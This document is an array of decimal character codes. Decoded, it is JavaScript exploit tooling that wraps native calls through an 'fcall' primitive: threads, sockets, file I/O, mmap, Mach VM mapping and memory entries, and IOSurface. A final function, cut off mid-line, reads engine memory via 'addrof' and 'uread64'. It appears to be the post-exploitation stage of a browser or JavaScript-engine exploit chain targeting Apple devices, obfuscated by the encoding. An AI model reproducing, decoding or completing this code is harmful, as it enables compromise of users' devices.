109, 97, 99, 104, 95, 116, 104, 114, 101, 97, 100, 95, 115, 101, 108, 102, 40, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 84, 72, 82, 69, 65, 68, 95, 83, 69, 76, 70, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 116, 104, 114, 101, 97, 100, 95, 103, 101, 116, 115, 112, 101, 99, 105, 102, 105, 99, 40, 107, 101, 121, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 84, 72, 82, 69, 65, 68, 95, 71, 69, 84, 83, 80, 69, 67, 73, 70, 73, 67, 44, 32, 107, 101, 121, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 116, 104, 114, 101, 97, 100, 95, 115, 101, 108, 102, 40, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 84, 72, 82, 69, 65, 68, 95, 83, 69, 76, 70, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 116, 104, 114, 101, 97, 100, 95, 106, 111, 105, 110, 40, 116, 104, 114, 44, 32, 118, 97, 108, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 84, 72, 82, 69, 65, 68, 95, 74, 79, 73, 78, 44, 32, 116, 104, 114, 44, 32, 118, 97, 108, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 95, 78, 83, 71, 101, 116, 69, 120, 101, 99, 117, 116, 97, 98, 108, 101, 80, 97, 116, 104, 40, 101, 120, 101, 99, 117, 116, 97, 98, 108, 101, 95, 112, 97, 116, 104, 44, 32, 108, 101, 110, 103, 116, 104, 95, 112, 116, 114, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 95, 78, 83, 71, 69, 84, 69, 88, 69, 67, 85, 84, 65, 66, 76, 69, 80, 65, 84, 72, 44, 32, 101, 120, 101, 99, 117, 116, 97, 98, 108, 101, 95, 112, 97, 116, 104, 44, 32, 108, 101, 110, 103, 116, 104, 95, 112, 116, 114, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 99, 111, 110, 102, 115, 116, 114, 40, 110, 97, 109, 101, 44, 32, 98, 117, 102, 44, 32, 108, 101, 110, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 79, 78, 70, 83, 84, 82, 44, 32, 110, 97, 109, 101, 44, 32, 98, 117, 102, 44, 32, 108, 101, 110, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 114, 99, 104, 114, 40, 115, 44, 32, 99, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 82, 67, 72, 82, 44, 32, 115, 44, 32, 99, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 99, 97, 116, 40, 115, 49, 44, 32, 115, 50, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 67, 65, 84, 44, 32, 115, 49, 44, 32, 115, 50, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 108, 101, 110, 40, 115, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 76, 69, 78, 44, 32, 115, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 115, 116, 114, 40, 115, 49, 44, 32, 115, 50, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 83, 84, 82, 44, 32, 115, 49, 44, 32, 115, 50, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 110, 99, 109, 112, 40, 115, 49, 44, 32, 115, 50, 44, 32, 110, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 78, 67, 77, 80, 44, 32, 115, 49, 44, 32, 115, 50, 44, 32, 110, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 111, 99, 107, 101, 116, 40, 100, 111, 109, 97, 105, 110, 44, 32, 116, 121, 112, 101, 44, 32, 112, 114, 111, 116, 111, 99, 111, 108, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 79, 67, 75, 69, 84, 44, 32, 100, 111, 109, 97, 105, 110, 44, 32, 116, 121, 112, 101, 44, 32, 112, 114, 111, 116, 111, 99, 111, 108, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 103, 101, 116, 115, 111, 99, 107, 111, 112, 116, 40, 115, 111, 99, 107, 101, 116, 44, 32, 108, 101, 118, 101, 108, 44, 32, 111, 112, 116, 105, 111, 110, 95, 110, 97, 109, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 118, 97, 108, 117, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 108, 101, 110, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 71, 69, 84, 83, 79, 67, 75, 79, 80, 84, 44, 32, 115, 111, 99, 107, 101, 116, 44, 32, 108, 101, 118, 101, 108, 44, 32, 111, 112, 116, 105, 111, 110, 95, 110, 97, 109, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 118, 97, 108, 117, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 108, 101, 110, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 101, 116, 115, 111, 99, 107, 111, 112, 116, 40, 115, 111, 99, 107, 101, 116, 44, 32, 108, 101, 118, 101, 108, 44, 32, 111, 112, 116, 105, 111, 110, 95, 110, 97, 109, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 118, 97, 108, 117, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 108, 101, 110, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 69, 84, 83, 79, 67, 75, 79, 80, 84, 44, 32, 115, 111, 99, 107, 101, 116, 44, 32, 108, 101, 118, 101, 108, 44, 32, 111, 112, 116, 105, 111, 110, 95, 110, 97, 109, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 118, 97, 108, 117, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 108, 101, 110, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 105, 108, 101, 112, 111, 114, 116, 95, 109, 97, 107, 101, 112, 111, 114, 116, 40, 102, 100, 44, 32, 112, 111, 114, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 73, 76, 69, 80, 79, 82, 84, 95, 77, 65, 75, 69, 80, 79, 82, 84, 44, 32, 102, 100, 44, 32, 112, 111, 114, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 105, 108, 101, 112, 111, 114, 116, 95, 109, 97, 107, 101, 102, 100, 40, 112, 111, 114, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 73, 76, 69, 80, 79, 82, 84, 95, 77, 65, 75, 69, 70, 68, 44, 32, 112, 111, 114, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 101, 109, 115, 101, 116, 95, 112, 97, 116, 116, 101, 114, 110, 56, 40, 98, 117, 102, 44, 32, 118, 97, 108, 44, 32, 115, 122, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 69, 77, 83, 69, 84, 95, 80, 65, 84, 84, 69, 82, 78, 56, 44, 32, 98, 117, 102, 44, 32, 118, 97, 108, 44, 32, 115, 122, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 101, 109, 109, 101, 109, 40, 98, 105, 103, 44, 32, 98, 105, 103, 95, 108, 101, 110, 44, 32, 108, 105, 116, 116, 108, 101, 44, 32, 108, 105, 116, 116, 108, 101, 95, 108, 101, 110, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 69, 77, 77, 69, 77, 44, 32, 98, 105, 103, 44, 32, 98, 105, 103, 95, 108, 101, 110, 44, 32, 108, 105, 116, 116, 108, 101, 44, 32, 108, 105, 116, 116, 108, 101, 95, 108, 101, 110, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 97, 99, 99, 101, 115, 115, 40, 112, 97, 116, 104, 44, 32, 109, 111, 100, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 65, 67, 67, 69, 83, 83, 44, 32, 112, 97, 116, 104, 44, 32, 109, 111, 100, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 112, 101, 110, 40, 112, 97, 116, 104, 44, 32, 109, 111, 100, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 79, 80, 69, 78, 44, 32, 112, 97, 116, 104, 44, 32, 109, 111, 100, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 111, 112, 101, 110, 40, 112, 97, 116, 104, 44, 32, 109, 111, 100, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 79, 80, 69, 78, 44, 32, 112, 97, 116, 104, 44, 32, 109, 111, 100, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 99, 108, 111, 115, 101, 40, 102, 100, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 67, 76, 79, 83, 69, 44, 32, 102, 100, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 119, 114, 105, 116, 101, 40, 98, 117, 102, 44, 32, 115, 122, 44, 32, 110, 105, 116, 101, 109, 44, 32, 102, 100, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 87, 82, 73, 84, 69, 44, 32, 98, 117, 102, 44, 32, 115, 122, 44, 32, 110, 105, 116, 101, 109, 44, 32, 102, 100, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 114, 101, 97, 100, 118, 40, 102, 105, 108, 100, 101, 115, 44, 32, 105, 111, 118, 44, 32, 105, 111, 118, 99, 110, 116, 44, 32, 111, 102, 102, 115, 101, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 82, 69, 65, 68, 86, 44, 32, 102, 105, 108, 100, 101, 115, 44, 32, 105, 111, 118, 44, 32, 105, 111, 118, 99, 110, 116, 44, 32, 111, 102, 102, 115, 101, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 119, 114, 105, 116, 101, 118, 40, 102, 105, 108, 100, 101, 115, 44, 32, 105, 111, 118, 44, 32, 105, 111, 118, 99, 110, 116, 44, 32, 111, 102, 102, 115, 101, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 87, 82, 73, 84, 69, 86, 44, 32, 102, 105, 108, 100, 101, 115, 44, 32, 105, 111, 118, 44, 32, 105, 111, 118, 99, 110, 116, 44, 32, 111, 102, 102, 115, 101, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 119, 114, 105, 116, 101, 40, 102, 105, 108, 100, 101, 115, 44, 32, 98, 117, 102, 102, 44, 32, 115, 105, 122, 101, 44, 32, 111, 102, 102, 115, 101, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 87, 82, 73, 84, 69, 44, 32, 102, 105, 108, 100, 101, 115, 44, 32, 98, 117, 102, 102, 44, 32, 115, 105, 122, 101, 44, 32, 111, 102, 102, 115, 101, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 114, 101, 97, 100, 40, 102, 105, 108, 100, 101, 115, 44, 32, 98, 117, 102, 102, 44, 32, 115, 105, 122, 101, 44, 32, 111, 102, 102, 115, 101, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 82, 69, 65, 68, 44, 32, 102, 105, 108, 100, 101, 115, 44, 32, 98, 117, 102, 102, 44, 32, 115, 105, 122, 101, 44, 32, 111, 102, 102, 115, 101, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 114, 101, 97, 100, 40, 102, 100, 44, 32, 98, 117, 102, 44, 32, 115, 122, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 82, 69, 65, 68, 44, 32, 102, 100, 44, 32, 98, 117, 102, 44, 32, 115, 122, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 119, 114, 105, 116, 101, 40, 102, 100, 44, 32, 98, 117, 102, 44, 32, 115, 122, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 87, 82, 73, 84, 69, 44, 32, 102, 100, 44, 32, 98, 117, 102, 44, 32, 115, 122, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 114, 101, 109, 111, 118, 101, 40, 112, 97, 116, 104, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 82, 69, 77, 79, 86, 69, 44, 32, 112, 97, 116, 104, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 97, 114, 99, 52, 114, 97, 110, 100, 111, 109, 40, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 65, 82, 67, 52, 82, 65, 78, 68, 79, 77, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 116, 97, 115, 107, 95, 116, 104, 114, 101, 97, 100, 115, 40, 116, 97, 115, 107, 44, 32, 116, 104, 114, 101, 97, 100, 95, 108, 105, 115, 116, 95, 97, 100, 100, 114, 44, 32, 116, 104, 114, 101, 97, 100, 95, 99, 111, 117, 110, 116, 95, 97, 100, 100, 114, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 84, 65, 83, 75, 95, 84, 72, 82, 69, 65, 68, 83, 44, 32, 116, 97, 115, 107, 44, 32, 116, 104, 114, 101, 97, 100, 95, 108, 105, 115, 116, 95, 97, 100, 100, 114, 44, 32, 116, 104, 114, 101, 97, 100, 95, 99, 111, 117, 110, 116, 95, 97, 100, 100, 114, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 99, 110, 116, 108, 40, 102, 100, 44, 32, 102, 108, 97, 103, 44, 32, 118, 97, 108, 117, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 67, 78, 84, 76, 44, 32, 102, 100, 44, 32, 102, 108, 97, 103, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 118, 97, 108, 117, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 108, 115, 101, 101, 107, 40, 102, 105, 108, 100, 101, 115, 44, 32, 111, 102, 102, 115, 101, 116, 44, 32, 119, 104, 101, 110, 99, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 76, 83, 69, 69, 75, 44, 32, 102, 105, 108, 100, 101, 115, 44, 32, 111, 102, 102, 115, 101, 116, 44, 32, 119, 104, 101, 110, 99, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 115, 121, 110, 99, 40, 102, 100, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 83, 89, 78, 67, 44, 32, 102, 100, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 87, 105, 116, 104, 67, 83, 116, 114, 105, 110, 103, 40, 97, 108, 108, 111, 99, 97, 116, 111, 114, 44, 32, 99, 115, 116, 114, 105, 110, 103, 44, 32, 101, 110, 99, 111, 100, 105, 110, 103, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 83, 84, 82, 73, 78, 71, 67, 82, 69, 65, 84, 69, 87, 73, 84, 72, 67, 83, 84, 82, 73, 78, 71, 44, 32, 97, 108, 108, 111, 99, 97, 116, 111, 114, 44, 32, 99, 115, 116, 114, 105, 110, 103, 44, 32, 101, 110, 99, 111, 100, 105, 110, 103, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 67, 111, 112, 121, 40, 97, 108, 108, 111, 99, 97, 116, 111, 114, 44, 32, 99, 102, 115, 116, 114, 105, 110, 103, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 83, 84, 82, 73, 78, 71, 67, 82, 69, 65, 84, 69, 67, 79, 80, 89, 44, 32, 97, 108, 108, 111, 99, 97, 116, 111, 114, 44, 32, 99, 102, 115, 116, 114, 105, 110, 103, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 83, 101, 116, 86, 97, 108, 117, 101, 40, 100, 105, 99, 116, 44, 32, 107, 101, 121, 44, 32, 118, 97, 108, 117, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 68, 73, 67, 84, 73, 79, 78, 65, 82, 89, 83, 69, 84, 86, 65, 76, 85, 69, 44, 32, 100, 105, 99, 116, 44, 32, 107, 101, 121, 44, 32, 118, 97, 108, 117, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 78, 117, 109, 98, 101, 114, 67, 114, 101, 97, 116, 101, 40, 97, 108, 108, 111, 99, 97, 116, 111, 114, 44, 32, 116, 104, 101, 84, 121, 112, 101, 44, 32, 118, 97, 108, 117, 101, 80, 116, 114, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 78, 85, 77, 66, 69, 82, 67, 82, 69, 65, 84, 69, 44, 32, 97, 108, 108, 111, 99, 97, 116, 111, 114, 44, 32, 116, 104, 101, 84, 121, 112, 101, 44, 32, 118, 97, 108, 117, 101, 80, 116, 114, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 73, 79, 83, 117, 114, 102, 97, 99, 101, 67, 114, 101, 97, 116, 101, 40, 100, 105, 99, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 73, 79, 83, 85, 82, 70, 65, 67, 69, 67, 82, 69, 65, 84, 69, 44, 32, 100, 105, 99, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 73, 79, 83, 117, 114, 102, 97, 99, 101, 71, 101, 116, 66, 97, 115, 101, 65, 100, 100, 114, 101, 115, 115, 40, 115, 117, 114, 102, 97, 99, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 73, 79, 83, 85, 82, 70, 65, 67, 69, 71, 69, 84, 66, 65, 83, 69, 65, 68, 68, 82, 69, 83, 83, 44, 32, 115, 117, 114, 102, 97, 99, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 73, 79, 83, 117, 114, 102, 97, 99, 101, 80, 114, 101, 102, 101, 116, 99, 104, 80, 97, 103, 101, 115, 40, 115, 117, 114, 102, 97, 99, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 73, 79, 83, 85, 82, 70, 65, 67, 69, 80, 82, 69, 70, 69, 84, 67, 72, 80, 65, 71, 69, 83, 44, 32, 115, 117, 114, 102, 97, 99, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 82, 101, 108, 101, 97, 115, 101, 40, 111, 98, 106, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 82, 69, 76, 69, 65, 83, 69, 44, 32, 111, 98, 106, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 83, 104, 111, 119, 40, 111, 98, 106, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 83, 72, 79, 87, 44, 32, 111, 98, 106, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 109, 97, 107, 101, 95, 109, 101, 109, 111, 114, 121, 95, 101, 110, 116, 114, 121, 95, 54, 52, 40, 116, 97, 114, 103, 101, 116, 95, 116, 97, 115, 107, 44, 32, 115, 105, 122, 101, 44, 32, 111, 102, 102, 115, 101, 116, 44, 32, 112, 101, 114, 109, 105, 115, 115, 105, 111, 110, 44, 32, 111, 98, 106, 101, 99, 116, 95, 104, 97, 110, 100, 108, 101, 44, 32, 112, 97, 114, 101, 110, 116, 95, 101, 110, 116, 114, 121, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 77, 65, 75, 69, 95, 77, 69, 77, 79, 82, 89, 95, 69, 78, 84, 82, 89, 95, 54, 52, 44, 32, 116, 97, 114, 103, 101, 116, 95, 116, 97, 115, 107, 44, 32, 115, 105, 122, 101, 44, 32, 111, 102, 102, 115, 101, 116, 44, 32, 112, 101, 114, 109, 105, 115, 115, 105, 111, 110, 44, 32, 111, 98, 106, 101, 99, 116, 95, 104, 97, 110, 100, 108, 101, 44, 32, 112, 97, 114, 101, 110, 116, 95, 101, 110, 116, 114, 121, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 118, 109, 95, 109, 97, 112, 40, 116, 97, 114, 103, 101, 116, 95, 116, 97, 115, 107, 44, 32, 97, 100, 100, 114, 101, 115, 115, 44, 32, 115, 105, 122, 101, 44, 32, 109, 97, 115, 107, 44, 32, 102, 108, 97, 103, 115, 44, 32, 111, 98, 106, 101, 99, 116, 44, 32, 111, 102, 102, 115, 101, 116, 44, 32, 99, 111, 112, 121, 44, 32, 99, 117, 114, 95, 112, 114, 111, 116, 101, 99, 116, 105, 111, 110, 44, 32, 109, 97, 120, 95, 112, 114, 111, 116, 101, 99, 116, 105, 111, 110, 44, 32, 105, 110, 104, 101, 114, 105, 116, 97, 110, 99, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 86, 77, 95, 77, 65, 80, 44, 32, 116, 97, 114, 103, 101, 116, 95, 116, 97, 115, 107, 44, 32, 97, 100, 100, 114, 101, 115, 115, 44, 32, 115, 105, 122, 101, 44, 32, 109, 97, 115, 107, 44, 32, 102, 108, 97, 103, 115, 44, 32, 111, 98, 106, 101, 99, 116, 44, 32, 111, 102, 102, 115, 101, 116, 44, 32, 99, 111, 112, 121, 44, 32, 99, 117, 114, 95, 112, 114, 111, 116, 101, 99, 116, 105, 111, 110, 32, 124, 32, 40, 109, 97, 120, 95, 112, 114, 111, 116, 101, 99, 116, 105, 111, 110, 32, 60, 60, 32, 51, 50, 110, 41, 44, 32, 105, 110, 104, 101, 114, 105, 116, 97, 110, 99, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 109, 97, 112, 40, 97, 100, 100, 114, 44, 32, 108, 101, 110, 44, 32, 112, 114, 111, 116, 44, 32, 102, 108, 97, 103, 115, 44, 32, 102, 100, 44, 32, 111, 102, 102, 115, 101, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 77, 65, 80, 44, 32, 97, 100, 100, 114, 44, 32, 108, 101, 110, 44, 32, 112, 114, 111, 116, 44, 32, 102, 108, 97, 103, 115, 44, 32, 102, 100, 44, 32, 111, 102, 102, 115, 101, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 108, 111, 99, 107, 40, 97, 100, 100, 114, 101, 115, 115, 44, 32, 115, 105, 122, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 76, 79, 67, 75, 44, 32, 97, 100, 100, 114, 101, 115, 115, 44, 32, 115, 105, 122, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 117, 110, 108, 111, 99, 107, 40, 97, 100, 100, 114, 101, 115, 115, 44, 32, 115, 105, 122, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 85, 78, 76, 79, 67, 75, 44, 32, 97, 100, 100, 114, 101, 115, 115, 44, 32, 115, 105, 122, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 112, 111, 114, 116, 95, 100, 101, 97, 108, 108, 111, 99, 97, 116, 101, 40, 116, 97, 115, 107, 44, 32, 110, 97, 109, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 80, 79, 82, 84, 95, 68, 69, 65, 76, 76, 79, 67, 65, 84, 69, 44, 32, 116, 97, 115, 107, 44, 32, 110, 97, 109, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 116, 97, 115, 107, 95, 115, 101, 108, 102, 40, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 48, 120, 50, 48, 51, 110, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 110, 101, 119, 95, 117, 105, 110, 116, 54, 52, 95, 116, 40, 118, 97, 108, 61, 48, 110, 41, 32, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 98, 117, 102, 32, 61, 32, 99, 97, 108, 108, 111, 99, 40, 49, 110, 44, 32, 56, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 98, 117, 102, 44, 32, 118, 97, 108, 41, 59, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 98, 117, 102, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 100, 105, 115, 97, 98, 108, 101, 95, 103, 99, 40, 41, 32, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 118, 109, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 97, 100, 100, 114, 111, 102, 40, 103, 108, 111, 98, 97, 108, 84, 104, 105, 115, 